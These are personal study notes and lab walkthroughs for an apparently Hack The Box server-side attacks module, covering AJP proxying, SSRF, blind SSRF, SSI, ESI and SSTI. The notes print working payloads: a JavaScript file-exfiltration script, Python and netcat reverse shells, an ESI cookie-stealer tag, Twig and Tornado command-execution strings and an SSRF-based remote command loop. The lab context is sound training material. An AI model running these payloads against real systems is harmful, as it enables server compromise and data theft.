# Intro

## Intro

Server-Side attacks target the application provided by a server. An excellent example of these attacks are Cross-Site Request Forgeries (CSRF) and Server-side Request Forgeries (SSRF).

At a high level, CSRF attacks may utilize other client side -attacks like XSS vulnerabilities to perform requests to a web application that a victim has already been authenticated to. This allows the attacker to perform actions as the authorized user, such as changing their password to something the attacker would know or performing any unwarranted action as the victim. 

This module covers:
Abusing Intermediary Applications
Server-Side Request Forgery (SSRF)
Server-Side Includes Injection (SSI)
Edge-Side Includes Injection (ESI)
Server-Side Template Injection (SSTI)
Extensible Stylesheet Language Transformations Server-Side Injection (XSLT)

# Abusing Intermediary Applications

## AJP Proxy

AJP (or JK) is a wire protocol specifically designed to let Tomcat work with Apache. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible but proxy the request to Tomcat for Tomcat-related content.

If we come across open AJP proxy ports (8009 TCP), we may be able to use them to access the hidden Apache Tomcat manager behind it. We can configure our own Nginx or Apache Server with AJP modules to interact with it and access the underlying application.

## Nginx Reverse Proxy & AJP

When we come across an open 8009 TCP port we can use Nginx with ajp_module to access the Tomcat manager.

We can do this by compiling the Nginx source and adding the required module as follows:
- Download the Nginx source code
- Download the required module
- Compile Nginx source code with the ajp_module.
- Create a configuration file pointing to the AJP Port

This section covers how to do this, but I could not get this work locally, so instead I used the pwn box.

The question in this section is:
Replicate the steps shown in this section to connect to the above server's "hidden" Tomcat page through the AJP proxy, then write the Tomcat version as your answer. Remember that the port you will see next to "Target:" will be the AJP proxy port. Answer format: X.X.XX 

Getting this answer was as easy as running the command son this page to install nginx and configure the port to aim to the correct place. The only trip up was I did not see the note saying to use the server port, not port 8009. After fixing that it worked perfectly.

## Apache Reverse Proxy & AJP

This section covers how to use Apache to do the same thing as the previous section.

It says these are the commands needed:
```
sudo apt install libapache2-mod-jk
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http
export TARGET="<TARGET_IP>"
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
sudo systemctl start apache2
``` 

Unfortunatly it seems like mod_jk is not available for Mac, so this also had to be done on the pwnbox.

There is no question in this section.

# Server Side Request Forgery (SSRF)

## Server Side Request Forgery (SSRF) Overview

SSRF attacks allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. The result of SSRF can lead to:
```
    Interacting with known internal systems
    Discovering internal services via port scans
    Disclosing local/sensitive data
    Including files in the target application
    Leaking NetNTLM hashes using UNC Paths (Windows)
    Achieving remote code execution
```

When hunting SSRF vulnerablilities we should look for:
```
    Parts of HTTP requests, including URLs
    File imports such as HTML, PDFs, images, etc.
    Remote server connections to fetch data
    API specification imports
    Dashboards including ping and similar functionalities to check server statuses
```

## SSRF Exploitation Example

After connecting to the VPN, 

Running `nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>` gets the open ports on the IP. We find that there are only 3 open ports.

Specifically, 22/tcp, 80/tcp, and 8080/tcp.

If we run `curl -i -s http://<TARGET IP>` to see the headers we can see that request gets redirected to /load?q=index.html, meaning the q parameter fetches the resource index.html. Lets follow that redirect to see if we can get more information.

`curl -i -s -L http://<TARGET IP>`

What we see is that it returns a page this time, and it has a comment mentioning an internal resource that gets returned from the q parameter. If we can confirm an SSRF vuln on this parameter we may be able to access this internal resource.

To test this, we can start a netcat listener on 8081 like:
`nc -nvlp 8081`

Then in another terminal we can run:
`curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8081"`

To get our TUN adapter IP, we can look in the output of open vpn for this line:
`/sbin/ifconfig utun3 10.10.15.33 10.10.15.33 netmask 255.255.254.0 mtu 1500 up`

The result of running this shows that they are making requests using the Python-urllib. If we read the docs for this library we see that it supports file, http, and ftp schemas. So we can issue HTTP request, and read local files via the file schema, and remote files using ftp.

To test this:

Create a file called Index.html with:
``` html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

Then in that same directory, start a server using `python3 -m http.server 9090`

Inside that the same directory start and ftp server using:
```
sudo pip3 install twisted
sudo python3 -m twisted ftp -p 21 -r .
```

Then we can retrieve index.html through ftp schema with:

`curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"`

If that works, we can try to retrieve files like:
`curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"`

Keep in mind that fetching remote HTML files can lead to Reflected XSS.

Remember we only have two open ports on the target server, however, there is a chance internal apps are listening to ports on localhost. To check this, we can use ffuf to enumerate these web apps by:

Generate a wordlist containing all possible ports:
`for port in {1..65535};do echo $port >> ports.txt;done`

Issue a cURL request to a random port to get the response size of a request for a non-existent service.
`curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"` 
For me this was 30.

Then we can use ffuf to discard responses with that size.
`ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30`

This shows a valid response on port 5000. If we run a regular curl on this one it returns a valid web page.

Up to this point we have learned how to reach the internal apps, and use different schemas to load local files through SSRF. But our ultimate goal is to achieve remote code execution on an internal host. 

Remember we uncovered that both applications load resources in the same way (using the q paramter).

If we run `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"` we can see it returns the same as the original request when using -L

Now lets discover any web apps lisening in localhost. Let's try to issue a request to a random port to indetify how closed ports look.

`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"`

For me the closed port has size 98 because it actually rendered some web content. However, in the output it returned an Error number and FFUF allows us to filter with a regular expression. So we can run the same test we did before on the ports filtering on this Errno like:

`ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'`

Running this returns another application listening on port 5000. Curling that url returns a list of files.

`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"`

```
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
```

So far we have done a lot to get information on this web app, now its time to uncover the source code to see if we can achieve remote code execution.

We can request the /proc/self/environ file, where our current path should be under PWD.

`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -`

The resulting html is:
``` html
<html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html>
```

In it, we see the pwd variable is /app.

So lets try to read the internal_local.py file:
`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"`` 

This code clearly takes a /runme?x=<cmd> parameter. And it just runs the code.

Running `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"` returns we are root.

However, if we try to run commands with a space it fails, so we have to encode the URL. But we have to do this 3 times because we pass it through 3 different web apps.

To do this we could use `https://www.urlencoder.org/` or we can use jq on the terminal.

Running something like `echo "encode me" | jq -sRr @uri` will encode our string.

Then we can run a function like this to get it to work:
``` Bash
function rce() {
        while true; do
                echo -n "# "; read cmd
                ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
                curl -s -o - "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
                echo ""
                done
}
```

With this we have achieved remote code execution.

The question of this section is:
Replicate what you learned in this section to gain code execution on the spawned target, then look for the flag in the root directory and submit the contents as your answer. 

Getting this with our remote code execution was as easy as running ls on /root and then cat /root/flag.txt

## Blind SSRF

Server-Side Request Forgery vulnerabilities can be "blind." In these cases, even though the request is processed, we can't see the backend server's response. For this reason, blind SSRF vulnerabilities are more difficult to detect and exploit.

We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:
```
    Burp Collaborator (Part of Burp Suite professional. Not Available in the community edition)
    http://pingb.in
```
Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.

## Blind SSRF Explotation Example

Target IP: 10.129.201.238

In this section we have an application that allows us to upload html and convert it to PDF.

If we upload any form of html, we always get the same response. So we don't have direct SSRF, but we can still check for Blind SSRF.

Lets create an html file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. For ease of use we will use a netcat on port 9090 for testing. But we could use Burp Collaborato or a Pingb.in URL as well.

``` html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://10.10.15.33:9090/x?=viaimgtag">
</body>
</html>
```

We are using the UTUN value from the vpn again here.

Then we can run `nc -nlvp 9090` and upload our file. We see a response which tells us this is vulnerable to blind SSRF.

The response is:
```
Connection from 10.129.201.238:49380
GET /x?=viaimgtag HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.15.33:9090
```

If we inspect the user agent, we notice wkhtmltopdf. If we read the [docs](https://wkhtmltopdf.org/downloads.html) for this we see:
```
Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.
```

So we can execute Javascript in wkhtmltopdf. Lets try to read a local file with the following html.
``` html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://10.10.15.33:9090/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

Note in this code we use to XMLHttpRequests Objects. One is to read the file, the other is to send it to our server.
Also we use btoa function to send the data encoded in base64.

Once we start another netcat listener, and upload this file, we get:
`cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=`

If we decode it, we get all the contents of /etc/passwd

In the previous section, we exploited an internal applocation through SSRF and executed remote commands on the target server. The same internal app (internal.app.local) exists in the current scenario. Lets compromise it again, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.

We can use the following reverse shell to upload.
`export RHOST="10.10.15.33";export RPORT="9090";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`

It mentions in this section its easy to figure out python is installed once we get remote code execution. I believe this is in reference to our previous achieval of this. But I think that just saying this is confusing and doesn't really teach us anything.

We do have to url encode the reverse shell above like we did last time. And since this is going through 2 apps, we have to pass it jq twice like `| jq -sRr @uri | jq -sRr @uri` 

That looks like:
`export%2520RHOST%253D10.10.15.33%253Bexport%2520RPORT%253D9090%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528RHOST%2529%252Cint%2528os.getenv%2528RPORT%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%252Fbin%252Fsh%2529%2527%250A%0A`

Then we need to create an html file that leverages this request:
``` html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.15.33%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true);
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

Then we can start the netcat listener again and upload the file, then we should get a working reverse shell.

The question in this section is:
The target is vulnerable to blind SSRF. Leverage this blind SSRF vulnerability to interact with internal.app.local and achieve remote code execution against the internal service listening on port 5000, as you did in the previous section. Submit the kernel release number as your answer (Answer format: X.X.X-XX) 

Once we get the reverse shell uploaded, all we have to do is run uname -a:
Linux f53c1f1e6368 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 GNU/Linux

## Time Based SSRF

We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services.

Let us submit the following document to the PDF application of the previous section and observe the response time.

``` html
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>
```

We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that internal.app.local was a valid internal application (that we could access through SSRF in the previous section).

In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.

# Server Side Includes (SSI) Injection

## Server Side Includes Overview

Server-side includes (SSI) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:

``` html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.

We need to submit payloads to the target application, such as the ones mentioned above, through input fields to test for SSI injection. The web server will parse and execute the directives before rendering the page if a vulnerability is present, but be aware that those vulnerabilities can exist in blind format too. Successful SSI injection can lead to extracting sensitive information from local files or even executing commands on the target web server.

## SSI Injection Explotation Example

This section just has us spawn a target and try some of previous commands to see if there is SSI Injection and low-and-behold there is. 

Then it mentions:
As we saw, running OS commands via SSI on the target application is possible, but who doesn't love shells? Have in mind the following reverse shell payload that will work even against OpenBSD-netcat that doesn't include the execute functionality by default. Also note that you won't be able to obtain a reverse shell in this section's exercise, due to network restrictions! 
``` html
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->```

- mkfifo /tmp/foo: Create a FIFO special file in /tmp/foo
- nc <IP> <PORT> 0</tmp/foo: Connect to the pentester machine and redirect the standard input descriptor
- | bin/bash 1>/tmp/foo: Execute /bin/bash redirecting the standard output descriptor to /tmp/foo
- rm /tmp/foo: Cleanup the FIFO file

The question int his section:
Use what you learned in this section to read the content of .htaccess.flag through SSI and submit it as your answer. 

<!--#exec cmd="ls -a" --> shows that .htaccess.flag is in the current directory.
<!--#exec cmd="cat .htaccess.flag" --> shows the flag

# Edge Sides Includes (ESI) Injection

## Edge-Side Includes (ESI) 

Edge Side Includes (ESI) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content, which would be otherwise unstorable through traditional caching protocols. Edge Side Includes (ESI) allow for dynamic web content assembly at the edge of the network (Content Delivery Network, User's Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (XML tags).

ESI tags are used to instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional information regarding a web page with an already cached template. This information may come from another server before rendering the web page to the end-user. ESI enable fully cached web pages to include dynamic content.

Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags by an attacker.

Although we can identify the use of ESI by inspecting response headers in search for Surrogate-Control: content="ESI/1.0", we usually need to use a blind attack approach to detect if ESI is in use or not. Specifically, we can introduce ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible. Some useful ESI tags are:

``` html
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

In some cases, we can achieve remote code execution when the application processing ESI directives supports XSLT, a dynamic language used to transform XML files. In that case, we can pass dca=xslt to the payload. The XML file selected will be processed with the possibility of performing XML External Entity Injection Attacks (XXE) with some limitations.

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) has created a table to help us understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported. Let us provide some explanations regarding the column names of the below table first:


- Includes: Supports the <esi:includes> directive
- Vars: Supports the <esi:vars> directive. Useful for bypassing XSS Filters
- Cookie: Document cookies are accessible to the ESI engine
- Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
- Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts

```
Software 	Includes 	Vars 	Cookies 	Upstream Headers Required 	Host Whitelist
Squid3 	Yes 	Yes 	Yes 	Yes 	No
Varnish Cache 	Yes 	No 	No 	Yes 	Yes
Fastly 	Yes 	No 	No 	No 	Yes
Akamai ESI Test Server (ETS) 	Yes 	Yes 	Yes 	No 	No
NodeJS esi 	Yes 	Yes 	Yes 	No 	No
NodeJS nodesi 	Yes 	No 	No 	No 	Optional
```

# Server-Side Template Injections

## Intro to Template Engines

This section just covers what template injections are and then gives some templates for us to test with locally if we want.

## SSTI Indentificaiton

We can detect SSTI vulnerabilities by injecting different tags in the inputs we control to see if they are evaluated in the response. We don't necessarily need to see the injected data reflected in the response we receive. Sometimes it is just evaluated on different pages (blind).

The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:
``` html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
```

We will look for "49" in the response when injecting these payloads to identify that server-side evaluation occurred.

The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include ${{<%[%'"}}%\. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions.

We can use tools such as [Tplmap](https://github.com/epinna/tplmap) or J2EE Scan (Burp Pro) to automatically test for SSTI vulnerabilities or create a payload list to use with Burp Intruder or ZAP.

There's a diagram on this page from PortsSwigger https://portswigger.net/research/server-side-template-injection that can help us determine what the technology that is vulnerable is:

Or we can try:

- Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used
- Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI
- Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.

## SSTI Exploitation Example 1

The focus of this section is to identify if SSTI exists then leverage to get the flag.

In the input field we can submit {7*7} and see if that results in 49. It doesn't.
So lets try ${7*7}. Nothing.
What about {{7*7}}? That works. So its vulnerable.

If we use the portswigger diagram, we may be able to determine what the underlying template engine is.
When {{7*7}} is evaluated successfully it tells us to try: {{7*'7'}}.

Since this works, we can tell we are dealing with either Jinja2 or Twig.

There are template specific payloads we can try to determine which:
Lets try the Twig one.
``` php
{{_self.env.display("TEST")}}
```

And this worked, so we are working with twig.

If we want more template specific payloads we can get them here:
[PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
[HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

We could have automated the template engine identification process we just executed through tplmap, as follows. If you didn't notice, the user's input is submitted via the name parameter and through a POST request (hence the -d parameter in tplmap).

```
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install virtualenv
virtualenv -p python2 venv
source venv/bin/activate
pip install -r requirements.txt
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john
```

This ^ expects Python2 which is no longer supported on Mac. To install this would have required extra work so I didn't.

The next step is to gain remote code execution on the target server. Before moving the payload part, it should be mentioned that Twig has a variable _self, which, in simple terms, makes a few of the internal APIs public. This _self object has been documented, so we don't need to brute force any variable names (more on that in the next SSTI exploitation examples). Back to the remote code execution part, we can use the getFilter function as it allows execution of a user-defined function via the following process:

- Register a function as a filter callback via registerUndefinedFilterCallback
- Invoke _self.env.getFilter() to execute the function we have just registered

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
```

If we do this with cURL `curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>`

We see we are root.

We could once again have used tplmap to get remote code execution. But I don't think thats neccessary.

The question in this section is:
Use what you learned in this section to obtain the flag which is hidden in the environment variables. Answer format: HTB{String} 

Running `curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("printenv")}}' http://<TARGET IP>:<PORT>`

We get the answer.

## SSTI Exploitation Example 2

This is another SSTI example. In this section we are dealing with an email application that takes the variable and sends it via a post request.

So we can try, `curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam`

The response doesn't seem to indicate this worked. So lets try:
`curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam`

This one worked. So using the PortSwigger diagram, lets try:
`curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam`

This one worked as well, however, if we try to submit the Twig or Jinja2 specific payloads both fail.
`curl -X POST -d 'email={{_self.env.display("TEST")}}' http://<TARGET IP>:<PORT>/jointheteam`
`curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam`

So obviously that diagram is not perfect.

What we could do is compile a list of payloads from `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2` and `https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection` and try to get the answer from that.

Eventually we would find that a Tornado specific payload works.
`curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam`

Here is where tplmap would be nice... because it automates this discovery. Perhaps I need to look into getting python2 on my Mac.

I followed the instructions on [this page](https://stackoverflow.com/questions/71739870/how-to-install-python-2-on-macos-12-3) to get python2 installed using pyenv 

Now I can run `pyenv shell 2.7.18` and running python should target python2.

Now if I try to run the commands from above again...

Still fails... 

I am going to say that if I have to use tplmap I will just use the pwnbox. It should already be on a Kali Linux distro.

The question in this section is:
Use what you learned in this section to read the contents of flag.txt, which resides in the current working directory. Answer format: HTB{String} 

Running  `./tplmap.py -u 'http://94.237.53.3:55510/jointheteam' -d email=blah --os-shell` on the pwnbox works

Then running:
```
ls
cat flag.txt
```
Gets the answer

## SSTI Exploitation Example 3

This section once again is solved by running tplmap with the --os-shell function. 

The section covers some interesting stuff for Python, but overall, I didn't feel it worth documenting.

# Extensible Stylesheet Language Transformations Server-Side Injections

## Attacking XSLT

There was a lot of information in this section but it was mostly academic. I followed along for a little while but not the whole way. This might be something I come back to.

# Skills Assessment

## Server-Side Attacks

The question in this section is:
Read the content of 'flag.txt' through a server-side attack without registering an account and submit its content as your answer. Answer format: HTB{String} 

Running nmap on this server `nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>` tells me that only ports 22, 34950, and 37075 are open. This doesn't indicate Tomcat (X).

What about SSRF?
`curl -i -s http://<TARGET IP>`

^ This did not work. So I went and looked at the other ports that were open to see if there was more information I was missing. There was a page for a tiny file manager, and I was sure this must be where I get access. Tiny file manager has an exploit that allows for remote code execution if we get admin access...

Looking at the docs for tiny file manager, they preconfigure the admin account to be admin/admin@123. This must be it right? Nope...

Theres another port that is open, but it doesn't actually work... 

Running tlpmap on literally every input variable doesn't work. And the question says to get the answer without creating an account. So what do I do?

I pulled up the forums for a hint. And someone mentioned a non-descript script.js file name...

Looking at it I see it's doing simple javascript obfuscation? When deobfusctated I get:
`http://window.location.host/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/message.txt`

When I look up window.location.host, it just returns the IP. So trying:
`curl "http://94.237.56.188:40867/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/message.txt"`

Returns `Are you sure?`
So trying `curl "http://94.237.56.188:40867/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/flag.txt"` and thats the whole answer...

This did not feel like it tested the skills in this section at all... I understand this is an SSRF. But it required finding it based on JS deobfuscation (which is fine), but then the solution was literally just changing the file being returned...

Overall very disappointed in this skill assessment.
